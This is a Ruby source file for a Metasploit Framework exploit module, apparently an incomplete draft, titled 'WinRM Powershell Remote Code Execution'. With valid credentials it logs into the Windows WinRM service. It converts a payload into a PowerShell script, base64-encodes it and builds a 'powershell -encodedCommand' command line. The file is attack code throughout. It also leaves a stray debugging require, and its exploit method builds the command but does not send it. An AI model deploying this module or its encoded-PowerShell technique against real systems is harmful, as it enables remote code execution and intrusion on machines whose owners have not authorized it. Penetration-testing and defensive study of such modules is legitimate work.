##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'pry'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::WinRM
	include Msf::Auxiliary::Report


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WinRM Powershell Remote Code Execution',
			'Description'    => %q{
					This module uses  valid redentials to login to the WinRM service
					and execute a payload as an encoded powershell command.
			},
			'Author'         => [ 'thelightcosine' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'WfsDelay'     => 10,
					'EXITFUNC' => 'process'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
		))

	end

	def exploit

		script = Msf::Util::EXE.to_win32pe_psh(framework,payload.encoded)

		#This code chunk is borrowed from the WinRM Ruby Gem by Dan Wanek 
		script = script.chars.to_a.join("\x00").chomp
	      script << "\x00" unless script[-1].eql? "\x00"
	      if(defined?(script.encode))
			script = script.encode('ASCII-8BIT')
	 		script = Base64.strict_encode64(script)
		else
			script = Base64.encode64(script).chomp
	      end
		cmd = "powershell -encodedCommand #{script}"
	end

end
